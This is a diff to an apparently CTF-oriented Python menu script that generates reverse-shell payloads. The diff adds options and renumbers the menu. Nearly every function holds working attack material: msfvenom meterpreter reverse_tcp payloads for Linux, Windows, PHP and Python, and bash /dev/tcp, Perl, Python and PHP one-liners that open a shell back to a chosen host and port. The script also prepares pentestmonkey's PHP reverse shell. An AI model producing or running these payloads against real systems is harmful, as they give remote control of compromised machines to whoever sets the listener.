@@ -57,15 +57,17 @@ def exec_menu(choice):
 
 # Menu 1
 def menu1():
-    print "Reverse Shells will be written /root/ctf/shell.*\n"
-    print "20. Linux MSVENOM"
-    print "21. Windows MSVENOM"
-    print "22. PHP MSVENOM"
-    print "23. Bash Oneliner"
-    print "24. Perl Oneliner"
-    print "25. Python Oneliner"
-    print "26. PHP Oneliner"
-    print "27. Edit pentestmonkey's php file"
+    print "20. linux/x86/meterpreter/reverse_tcp"
+    print "21. linux/x64/meterpreter/reverse_tcp" 
+    print "22. windows/meterpreter/reverse_tcp"
+    print "23. windows/x64/meterpreter/reverse_tcp" 
+    print "24. php/meterpreter_reverse_tcp"
+    print "25. python/meterpreter/reverse_tcp"
+    print "26. Bash Oneliner"
+    print "27. Perl Oneliner"
+    print "28. Python Oneliner"
+    print "29. PHP Oneliner"
+    print "30. Edit pentestmonkey's php file"
     print "9. Back"
     print "0. Quit"
     choice = raw_input(" >>  ")
@@ -123,40 +125,58 @@ def perl_tty():
     shellcode = 'perl: exec "/bin/sh";'
     oneliner(shellcode)
 
-#MSVENOM Linux
-def linux_msvenom():
+#Linux x86 Meterpreter Menu 20
+def linux_x86_meterpreter_reverse_tcp():
     shellcode = "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f elf -o shell.elf" % args
     msfvenom(shellcode)
 
-#MSVENOM Windows
-def windows_msvenom():
+#Linux x64 Meterpreter Menu 21
+def linux_x64_meterpreter_reverse_tcp():
+    shellcode = "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f elf -o shell64.elf" % args
+    msfvenom(shellcode)
+
+#Windows x64 Meterpreter Menu 22
+def windows_meterpreter_reverse_tcp():
     shellcode = "msfvenom -p windows/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f exe -o shell.exe" % args
     msfvenom(shellcode)
 
-#MSVENOM PHP
-def php_msvenom():
-    shellcode = "msfvenom -p php/meterpreter_reverse_tcp LHOST=%s LPORT=%s -f raw -o shell.php" % args
+#Windows x64 Meterpreter Menu 23
+def windows_x64_meterpreter_reverse_tcp():
+    shellcode = "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f exe -o shell64.exe" % args
     msfvenom(shellcode)
 
-#Bash Oneliner
+#PHP Meterpreter Menu 24
+def php_meterpreter_reverse_tcp():
+    shellcode = "msfvenom -p php/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f raw -o shell.php" % args
+    msfvenom(shellcode)
+
+#Python Metepreter Menu 25
+def python_meterpreter_reverse_tcp(): 
+    shellcode = "msfvenom -p python/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f raw -o shell.py" % args
+    msfvenom(shellcode)
+
+#Bash Oneliner Menu 26
 def bash_oneliner():
 	shellcode = 'bash -i >& /dev/tcp/%s/%s 0>&1' % args
 	oneliner(shellcode)
 
-#Python Oneliner
+#Python Oneliner Menu 27
 def perl_oneliner():
 	shellcode = 'perl -e \'use Socket;$i="%s";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'' % args
 	oneliner(shellcode)
 
-#Python Oneline
+#Python Oneliner Menu 28
 def python_oneliner():
 	shellcode = 'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'' % args
 	oneliner(shellcode)
 
-#PHP Oneliner
+#PHP Oneliner Menu 29
 def php_oneliner():
 	shellcode = 'php -r \'$sock=fsockopen("%s",%s);exec("/bin/sh -i <&3 >&3 2>&3");\'' % args
 	oneliner(shellcode)
+
+# Other resources
+# http://bernardodamele.blogspot.com/2011/09/reverse-shells-one-liners.html
 
 #MSFVENOM shortcode
 def msfvenom(shellcode):
@@ -173,10 +193,10 @@ def oneliner(shellcode):
 	pyperclip.copy(shellcode)
 	sys.exit
 
-#Edit PHP Monkey's File	
-def php_file():
+#Edit PHP Monkey's File	Menu 30
+def php_file_pentestmonkey():
         filename = "php-reverse-shell.php"
-        os.system("rm " + filename)
+        #os.system("rm " + filename)
 	fin = open("php-reverse-shell-template.php")
 	fout = open(filename, "wt")
 	for line in fin:
@@ -204,14 +224,17 @@ menu_actions = {
     '11': bash_tty,
     '12': bin_tty,
     '13': perl_tty,
-    '20': linux_msvenom,
-    '21': windows_msvenom,
-    '22': php_msvenom,
-    '23': bash_oneliner,
-    '24': perl_oneliner,
-    '25': python_oneliner,
-    '26': php_oneliner,
-    '27': php_file,
+    '20': linux_x86_meterpreter_reverse_tcp,
+    '21': linux_x64_meterpreter_reverse_tcp,
+    '22': windows_meterpreter_reverse_tcp,
+    '23': windows_x64_meterpreter_reverse_tcp,
+    '24': php_meterpreter_reverse_tcp,
+    '25': python_meterpreter_reverse_tcp,
+    '26': bash_oneliner,
+    '27': perl_oneliner,
+    '28': python_oneliner,
+    '29': php_oneliner,
+    '30': php_file_pentestmonkey,
     '9': back,
     '0': exit,
 }
